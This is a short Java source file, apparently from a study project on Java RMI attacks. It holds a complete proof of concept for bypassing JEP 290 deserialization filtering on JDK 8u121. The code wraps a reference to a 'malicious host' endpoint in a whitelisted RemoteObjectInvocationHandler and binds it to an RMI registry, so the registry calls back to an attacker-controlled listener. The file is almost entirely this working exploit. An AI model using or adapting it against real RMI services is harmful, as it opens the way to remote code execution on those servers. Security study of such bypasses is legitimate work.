package com.lingx5.RMI;

import sun.rmi.server.UnicastRef;
import sun.rmi.transport.Endpoint;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Random;

public class bypassJEP8u121 {
    public static void main(String[] args) throws Exception {
        // 创建一个Endpoint对象，指定恶意主机和端口号
        Endpoint endpoint = new TCPEndpoint("127.0.0.1",9999);
        // 封装为一个LiveRef对象
        LiveRef liveRef = new LiveRef(new ObjID(new Random().nextInt()), endpoint, false);
        // 封装为UnicastRef对象
        UnicastRef unicastRef = new UnicastRef(liveRef);
        // 封装为白名单的RemoteObjectInvocationHandler对象
        RemoteObjectInvocationHandler handler = new RemoteObjectInvocationHandler(unicastRef);
        // 拿到RegistryStub对象
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
        registry.bind("bypass", handler);
    }
}
